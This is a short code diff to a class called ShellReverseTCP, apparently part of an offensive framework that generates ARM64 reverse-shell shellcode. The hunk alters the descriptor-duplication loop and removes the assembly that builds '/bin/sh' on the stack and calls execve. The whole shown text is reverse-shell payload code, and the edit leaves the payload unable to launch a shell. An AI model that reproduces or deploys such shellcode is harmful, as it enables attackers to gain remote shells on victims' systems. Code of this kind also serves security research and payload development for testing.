@@ -72,16 +72,8 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             mov x8, #24
             svc #0x1337
 
-            cmp x1, #1
+            cmp x1, #0
             bne dup
-            mov x3, #0x622f
-            movk x3, #0x6e69, lsl #16
-            movk x3, #0x732f, lsl #32
-            movk x3, #0x68, lsl #48
-            str x3, [sp, #-8]!
-            add x0, sp, x1
-            mov x8, #221
-            svc #0x1337
         """
 
         if assemble:
